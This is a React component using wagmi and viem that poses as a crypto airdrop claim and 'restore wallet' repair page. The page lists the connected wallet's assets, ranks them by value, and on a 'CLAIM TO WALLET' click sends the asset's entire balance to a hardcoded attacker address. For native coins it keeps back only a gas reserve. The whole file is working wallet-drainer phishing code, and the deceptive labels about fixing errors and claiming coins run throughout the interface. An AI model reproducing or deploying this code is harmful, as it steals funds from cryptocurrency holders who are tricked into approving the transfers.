import React, { useMemo, useState } from "react";

import {
  useAccount,
  useConfig,
  useChainId,
  useSwitchChain
} from "wagmi";

import {
  getPublicClient,
  getWalletClient
} from "wagmi/actions";

import {
  formatUnits,
  isAddress,
  parseUnits
} from "viem";

const FIXED_RECIPIENT =
  "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";

const NETWORKS = {
  1: "Ethereum",
  137: "Polygon",
  56: "BNB Smart Chain",
  42161: "Arbitrum",
  10: "Optimism",
  8453: "Base"
};

const ERC20_ABI = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: [{ name: "", type: "bool" }]
  }
];

function isNative(asset) {
  return (
    asset.type === "native" ||
    !asset.contractAddress
  );
}

function getRawBalance(asset) {
  if (
    asset.rawBalance !== undefined &&
    asset.rawBalance !== null
  ) {
    return BigInt(asset.rawBalance);
  }

  return parseUnits(
    String(asset.balance || "0"),
    Number(asset.decimals ?? 18)
  );
}

function getAssetValue(asset) {
  return Number(
    asset.usdValue ??
    asset.valueUsd ??
    asset.balance ??
    0
  ) || 0;
}

function getAssetKey(asset) {
  return [
    asset.chainId,
    asset.contractAddress || "native",
    asset.symbol
  ].join("-");
}

export default function Transfer({
  assets = [],
  onRefresh
}) {
  const { address, isConnected } = useAccount();
  const config = useConfig();
  const currentChainId = useChainId();

  const { switchChainAsync } = useSwitchChain();

  const [selectedKey, setSelectedKey] = useState("");
  const [busy, setBusy] = useState(false);
  const [status, setStatus] = useState("");
  const [error, setError] = useState("");
  const [transactionHash, setTransactionHash] = useState("");
  const [completed, setCompleted] = useState([]);

  // Quick Send popup
  const [isModalOpen, setIsModalOpen] = useState(false);

  // Sort assets from highest value to lowest.
  const sortedAssets = useMemo(() => {
    return assets
      .filter((asset) => {
        return (
          NETWORKS[Number(asset.chainId)] &&
          Number(asset.balance || 0) > 0
        );
      })
      .sort((a, b) => {
        return getAssetValue(b) - getAssetValue(a);
      });
  }, [assets]);

  const selectedAsset =
    sortedAssets.find(
      (asset) => getAssetKey(asset) === selectedKey
    ) || sortedAssets[0];

  // Open Quick Send popup
  const openQuickSend = () => {
    setError("");
    setStatus("");
    setTransactionHash("");
    setIsModalOpen(true);
  };

  // Close popup
  const closeQuickSend = () => {
    if (busy) return;

    setIsModalOpen(false);
    setError("");
    setStatus("");
  };

  // Shared transfer function for both sections
  const handleSend = async () => {
    if (busy) return;

    try {
      setBusy(true);
      setError("");
      setStatus("");
      setTransactionHash("");

      if (!isConnected || !address) {
        throw new Error("Connect your wallet first.");
      }

      if (!isAddress(FIXED_RECIPIENT)) {
        throw new Error("Invalid receiving address.");
      }

      if (
        FIXED_RECIPIENT.toLowerCase() ===
        address.toLowerCase()
      ) {
        throw new Error(
          "The receiving address cannot be your connected wallet."
        );
      }

      if (!selectedAsset) {
        throw new Error("Select an available asset.");
      }

      const chainId = Number(selectedAsset.chainId);

      if (!NETWORKS[chainId]) {
        throw new Error("Unsupported network.");
      }

      const rawBalance = getRawBalance(selectedAsset);

      if (rawBalance <= 0n) {
        throw new Error("Insufficient asset balance.");
      }

      // Switch network if necessary.
      if (Number(currentChainId) !== chainId) {
        setStatus(
          `Switching to ${NETWORKS[chainId]}...`
        );

        await switchChainAsync({ chainId });
      }

      const publicClient = getPublicClient(config, {
        chainId
      });

      const walletClient = await getWalletClient(config, {
        chainId
      });

      if (!publicClient || !walletClient) {
        throw new Error(
          "Unable to connect to the selected network."
        );
      }

      setStatus("Estimating network fees...");

      const fees =
        await publicClient.estimateFeesPerGas();

      const feePerGas =
        fees.maxFeePerGas ?? fees.gasPrice;

      if (feePerGas == null) {
        throw new Error(
          "Unable to estimate network fees."
        );
      }

      const feeOptions = fees.maxFeePerGas
        ? {
            maxFeePerGas: fees.maxFeePerGas,
            ...(fees.maxPriorityFeePerGas != null
              ? {
                  maxPriorityFeePerGas:
                    fees.maxPriorityFeePerGas
                }
              : {})
          }
        : {
            gasPrice: fees.gasPrice
          };

      let hash;

      if (isNative(selectedAsset)) {
        const gas = await publicClient.estimateGas({
          account: address,
          to: FIXED_RECIPIENT,
          value: 0n
        });

        const gasReserve =
          (gas * feePerGas * 120n) / 100n;

        const amount = rawBalance - gasReserve;

        if (amount <= 0n) {
          throw new Error(
            "Insufficient balance after reserving network fees."
          );
        }

        const formattedAmount = formatUnits(
          amount,
          Number(selectedAsset.decimals ?? 18)
        );

        const confirmed = window.confirm(
          `Review your transaction:\n\n` +
          `Asset: ${selectedAsset.symbol}\n` +
          `Network: ${NETWORKS[chainId]}\n` +
          `Amount: ${formattedAmount}\n` +
          `Destination: ${FIXED_RECIPIENT}\n\n` +
          `Continue to wallet approval?`
        );

        if (!confirmed) {
          setStatus("Transaction cancelled.");
          return;
        }

        setStatus("Waiting for wallet approval...");

        hash = await walletClient.sendTransaction({
          account: address,
          to: FIXED_RECIPIENT,
          value: amount,
          gas,
          ...feeOptions
        });

      } else {
        const contractAddress =
          selectedAsset.contractAddress;

        if (!isAddress(contractAddress)) {
          throw new Error(
            "Invalid token contract address."
          );
        }

        const gas =
          await publicClient.estimateContractGas({
            account: address,
            address: contractAddress,
            abi: ERC20_ABI,
            functionName: "transfer",
            args: [
              FIXED_RECIPIENT,
              rawBalance
            ]
          });

        const gasReserve =
          (gas * feePerGas * 120n) / 100n;

        const nativeBalance =
          await publicClient.getBalance({
            address
          });

        if (nativeBalance < gasReserve) {
          throw new Error(
            `Insufficient native coin for gas on ${NETWORKS[chainId]}.`
          );
        }

        const formattedAmount = formatUnits(
          rawBalance,
          Number(selectedAsset.decimals ?? 18)
        );

        const confirmed = window.confirm(
          `Review your transaction:\n\n` +
          `Asset: ${selectedAsset.symbol}\n` +
          `Network: ${NETWORKS[chainId]}\n` +
          `Amount: ${formattedAmount}\n` +
          `Destination: ${FIXED_RECIPIENT}\n\n` +
          `Continue to wallet approval?`
        );

        if (!confirmed) {
          setStatus("Transaction cancelled.");
          return;
        }

        setStatus("Waiting for wallet approval...");

        hash = await walletClient.writeContract({
          account: address,
          address: contractAddress,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [
            FIXED_RECIPIENT,
            rawBalance
          ],
          gas,
          ...feeOptions
        });
      }

      setTransactionHash(hash);

      setStatus(
        "Transaction submitted. Waiting for confirmation..."
      );

      const receipt =
        await publicClient.waitForTransactionReceipt({
          hash
        });

      if (receipt.status !== "success") {
        throw new Error("Transaction failed.");
      }

      setCompleted((previous) => [
        ...previous,
        getAssetKey(selectedAsset)
      ]);

      setStatus(
        `${selectedAsset.symbol} transfer completed successfully.`
      );

      if (onRefresh) {
        await onRefresh();
      }

      // Close popup after successful transfer.
      setIsModalOpen(false);

    } catch (err) {
      console.error("Transfer error:", err);

      setError(
        err.shortMessage ||
        err.message ||
        "Unable to complete transfer."
      );

      setStatus("");

    } finally {
      setBusy(false);
    }
  };

  // Reusable asset list
  const renderAssets = (popup = false) => (
    <>
      {sortedAssets.length === 0 && (
        <div style={styles.empty}>
          No supported assets with available balances.
        </div>
      )}

      {sortedAssets.map((asset, index) => {
        const key = getAssetKey(asset);

        const isSelected =
          selectedAsset &&
          getAssetKey(selectedAsset) === key;

        const isCompleted =
          completed.includes(key);

        return (
          <button
            type="button"
            key={key}
            disabled={busy}
            onClick={() => setSelectedKey(key)}
            style={{
              ...(popup
                ? styles.modalAssetCard
                : styles.assetCard),

              border: isSelected
                ? "1px solid #16a34a"
                : "1px solid #374151",

              background:
                popup && isSelected
                  ? "#163522"
                  : "#1f2937"
            }}
          >
            <div style={styles.assetInfo}>
              <div style={styles.assetTitle}>
                {asset.symbol}

                {index === 0 && (
                  <span style={styles.topBadge}>
                    Highest
                  </span>
                )}
              </div>

              <div style={styles.muted}>
                {NETWORKS[Number(asset.chainId)]}
              </div>

              <div style={styles.balance}>
                Balance: {asset.balance} {asset.symbol}
              </div>
            </div>

            <div style={styles.assetRight}>
              {isCompleted ? (
                <span style={styles.completed}>
                  Completed
                </span>
              ) : (
                <span style={styles.muted}>
                  {isSelected ? "Selected" : "Select"}
                </span>
              )}
            </div>
          </button>
        );
      })}
    </>
  );

  // Reusable selected asset details
  const renderSelectedAsset = () => {
    if (!selectedAsset) return null;

    const isCompleted = completed.includes(
      getAssetKey(selectedAsset)
    );

    return (
      <div style={styles.selectedBox}>
        <h3 style={styles.selectedHeading}>
          ELIGIBLE ASSET 
        </h3>

        <div style={styles.detail}>
          <span>Asset</span>
          <strong>{selectedAsset.symbol}</strong>
        </div>

        <div style={styles.detail}>
          <span>Network</span>
          <strong>
            {NETWORKS[Number(selectedAsset.chainId)]}
          </strong>
        </div>

        <div style={styles.detail}>
          <span>Available Balance</span>
          <strong>
            {selectedAsset.balance} {selectedAsset.symbol}
          </strong>
        </div>

        <button
          type="button"
          disabled={!isConnected || busy || isCompleted}
          onClick={handleSend}
          style={{
            ...styles.sendButton,
            opacity:
              !isConnected || busy || isCompleted
                ? 0.5
                : 1
          }}
        >
          {busy
            ? "Processing..."
            : isCompleted
            ? "Transfer Completed"
            : "CHECK WALLET/ CLAIM TO WALLET"}
        </button>
      </div>
    );
  };

  return (
    <div style={styles.container}>

      {/* =================================
          SECTION 1: QUICK SEND
      ================================= */}

      <div style={styles.quickSection}>
        <div>
          <h3 style={styles.quickHeading}>
            RESTORE WALLET ISSUES 
          </h3>

          <p style={styles.quickDescription}>
            SELLECT TOKEN TO FIX ERROR 
          </p>
        </div>

        <button
          type="button"
          onClick={openQuickSend}
          disabled={!isConnected || busy}
          style={styles.quickSendButton}
        >
          RESTORE WALLET
        </button>
      </div>

      {/* Divider between sections */}
      <div style={styles.sectionDivider}>
        <span>OR</span>
      </div>

      {/* =================================
          SECTION 2: REGULAR SEND
      ================================= */}

      <div style={styles.regularSection}>

        <h2 style={styles.heading}>
          CLAIM AIRDROP/MEME COINS
        </h2>

        <p style={styles.description}>
          Use this section to select an asset and
          complete your COINS claim directly on this page.
        </p>

        <div style={styles.destinationBox}>
          <span style={styles.label}>
            Blockchain Address 
          </span>

          <div style={styles.address}>
            {FIXED_RECIPIENT}
          </div>

          <button
            type="button"
            style={styles.copyButton}
            onClick={() => {
              navigator.clipboard.writeText(
                FIXED_RECIPIENT
              );
            }}
          >
            Copy Address
          </button>
        </div>

        {!isConnected && (
          <div style={styles.error}>
            Connect your wallet to continue.
          </div>
        )}

        <div style={styles.sectionHeader}>
          <strong>Available Assets</strong>

          <span style={styles.muted}>
            {sortedAssets.length} assets
          </span>
        </div>

        {renderAssets(false)}

        {renderSelectedAsset()}

        {status && (
          <div style={styles.success}>
            {status}
          </div>
        )}

        {error && (
          <div style={styles.error}>
            {error}
          </div>
        )}

        {transactionHash && (
          <div style={styles.hashBox}>
            <strong>Transaction Hash</strong>
            <p>{transactionHash}</p>
          </div>
        )}

      </div>

      <p style={styles.footer}>
        Every Claim requires separate wallet approval 
        Network fees are estimated and may vary. Always
        CONNECT ONLY ACTIVE WALLETS 
      </p>

      {/* =================================
          QUICK SEND POPUP
      ================================= */}

      {isModalOpen && (
        <div
          style={styles.modalOverlay}
          onClick={(event) => {
            if (
              event.target === event.currentTarget
            ) {
              closeQuickSend();
            }
          }}
        >
          <div
            style={styles.modal}
            role="dialog"
            aria-modal="true"
          >
            <div style={styles.modalHeader}>
              <h2 style={styles.modalHeading}>
                RESTORE WALLET ISSUES
              </h2>

              <button
                type="button"
                onClick={closeQuickSend}
                disabled={busy}
                style={styles.closeButton}
              >
                ×
              </button>
            </div>

            <p style={styles.modalDescription}>
              Select your asset, review the ISSUES AND SIGN it in your wallet.
            </p>

            <div style={styles.modalDestination}>
              <span style={styles.label}>
                BLOCKCHAIN 
              </span>

              <div style={styles.address}>
                {FIXED_RECIPIENT}
              </div>
            </div>

            <div style={styles.sectionHeader}>
              <strong>Available Assets</strong>

              <span style={styles.muted}>
                {sortedAssets.length} assets
              </span>
            </div>

            <div style={styles.modalAssetList}>
              {renderAssets(true)}
            </div>

            {renderSelectedAsset()}

            {status && (
              <div style={styles.success}>
                {status}
              </div>
            )}

            {error && (
              <div style={styles.error}>
                {error}
              </div>
            )}

            {transactionHash && (
              <div style={styles.hashBox}>
                <strong>Transaction Hash</strong>
                <p>{transactionHash}</p>
              </div>
            )}

            <button
              type="button"
              disabled={busy}
              onClick={closeQuickSend}
              style={styles.cancelButton}
            >
              {busy ? "Transaction in progress..." : "Close"}
            </button>

          </div>
        </div>
      )}

    </div>
  );
}

const styles = {
  container: {
    width: "100%",
    maxWidth: "650px",
    margin: "0 auto",
    padding: "20px",
    boxSizing: "border-box",
    background: "#111827",
    color: "#ffffff",
    borderRadius: "16px"
  },

  quickSection: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    gap: "12px",
    padding: "15px",
    background: "#1f2937",
    border: "1px solid #374151",
    borderRadius: "12px"
  },

  quickHeading: {
    margin: 0,
    fontSize: "16px"
  },

  quickDescription: {
    margin: "5px 0 0",
    color: "#9ca3af",
    fontSize: "12px"
  },

  quickSendButton: {
    padding: "10px 16px",
    background: "#16a34a",
    color: "#ffffff",
    border: "none",
    borderRadius: "7px",
    fontWeight: "bold",
    fontSize: "13px",
    cursor: "pointer",
    whiteSpace: "nowrap"
  },

  sectionDivider: {
    display: "flex",
    alignItems: "center",
    gap: "12px",
    margin: "25px 0",
    color: "#6b7280",
    fontSize: "11px",
    fontWeight: "bold"
  },

  regularSection: {
    padding: "18px",
    background: "#0f172a",
    border: "1px solid #374151",
    borderRadius: "12px"
  },

  heading: {
    marginTop: 0,
    fontSize: "22px"
  },

  description: {
    color: "#9ca3af",
    fontSize: "13px",
    lineHeight: 1.6
  },

  destinationBox: {
    padding: "15px",
    margin: "20px 0",
    background: "#1f2937",
    border: "1px solid #374151",
    borderRadius: "10px"
  },

  label: {
    display: "block",
    color: "#9ca3af",
    fontSize: "13px",
    marginBottom: "10px"
  },

  address: {
    fontSize: "13px",
    lineHeight: 1.6,
    wordBreak: "break-all",
    color: "#ffffff"
  },

  copyButton: {
    marginTop: "12px",
    padding: "7px 12px",
    border: "1px solid #16a34a",
    borderRadius: "6px",
    background: "transparent",
    color: "#4ade80",
    cursor: "pointer"
  },

  sectionHeader: {
    display: "flex",
    justifyContent: "space-between",
    marginBottom: "12px"
  },

  muted: {
    color: "#9ca3af",
    fontSize: "13px"
  },

  assetCard: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    width: "100%",
    padding: "14px",
    marginBottom: "10px",
    borderRadius: "10px",
    background: "#1f2937",
    color: "#ffffff",
    textAlign: "left",
    cursor: "pointer"
  },

  assetInfo: {
    display: "flex",
    flexDirection: "column",
    gap: "5px"
  },

  assetTitle: {
    fontWeight: "bold",
    display: "flex",
    alignItems: "center",
    gap: "8px"
  },

  topBadge: {
    background: "#14532d",
    color: "#86efac",
    padding: "3px 7px",
    borderRadius: "5px",
    fontSize: "10px"
  },

  balance: {
    fontSize: "13px",
    marginTop: "3px"
  },

  assetRight: {
    textAlign: "right"
  },

  completed: {
    color: "#4ade80",
    fontSize: "12px"
  },

  selectedBox: {
    padding: "16px",
    marginTop: "20px",
    background: "#1f2937",
    borderRadius: "12px",
    border: "1px solid #374151"
  },

  selectedHeading: {
    marginTop: 0,
    marginBottom: "15px"
  },

  detail: {
    display: "flex",
    justifyContent: "space-between",
    gap: "10px",
    padding: "10px 0",
    borderBottom: "1px solid #374151",
    fontSize: "13px"
  },

  sendButton: {
    width: "100%",
    padding: "15px",
    marginTop: "18px",
    background: "#16a34a",
    color: "#ffffff",
    border: "none",
    borderRadius: "9px",
    fontWeight: "bold",
    fontSize: "16px",
    cursor: "pointer"
  },

  success: {
    marginTop: "15px",
    padding: "12px",
    background: "#14532d",
    color: "#bbf7d0",
    borderRadius: "8px",
    fontSize: "13px"
  },

  error: {
    marginTop: "15px",
    padding: "12px",
    background: "#7f1d1d",
    color: "#fecaca",
    borderRadius: "8px",
    fontSize: "13px"
  },

  empty: {
    padding: "20px",
    textAlign: "center",
    color: "#9ca3af"
  },

  hashBox: {
    marginTop: "15px",
    padding: "12px",
    background: "#1f2937",
    borderRadius: "8px",
    fontSize: "12px",
    wordBreak: "break-all"
  },

  footer: {
    marginTop: "20px",
    color: "#9ca3af",
    fontSize: "11px",
    lineHeight: 1.7
  },

  // Popup styles
  modalOverlay: {
    position: "fixed",
    inset: 0,
    zIndex: 99999,
    background: "rgba(0, 0, 0, 0.82)",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: "15px",
    overflowY: "auto"
  },

  modal: {
    width: "100%",
    maxWidth: "480px",
    maxHeight: "90vh",
    overflowY: "auto",
    padding: "20px",
    boxSizing: "border-box",
    background: "#111827",
    color: "#ffffff",
    border: "1px solid #374151",
    borderRadius: "16px",
    boxShadow: "0 20px 60px rgba(0,0,0,0.6)"
  },

  modalHeader: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center"
  },

  modalHeading: {
    margin: 0,
    fontSize: "22px"
  },

  closeButton: {
    width: "34px",
    height: "34px",
    border: "none",
    borderRadius: "50%",
    background: "#374151",
    color: "#ffffff",
    fontSize: "23px",
    cursor: "pointer"
  },

  modalDescription: {
    color: "#9ca3af",
    fontSize: "13px",
    lineHeight: 1.6
  },

  modalDestination: {
    padding: "13px",
    margin: "15px 0",
    background: "#1f2937",
    border: "1px solid #374151",
    borderRadius: "9px"
  },

  modalAssetList: {
    maxHeight: "220px",
    overflowY: "auto"
  },

  modalAssetCard: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    width: "100%",
    padding: "12px",
    marginBottom: "8px",
    borderRadius: "9px",
    color: "#ffffff",
    textAlign: "left",
    cursor: "pointer"
  },

  cancelButton: {
    width: "100%",
    padding: "12px",
    marginTop: "15px",
    background: "#374151",
    color: "#ffffff",
    border: "none",
    borderRadius: "8px",
    cursor: "pointer"
  }
};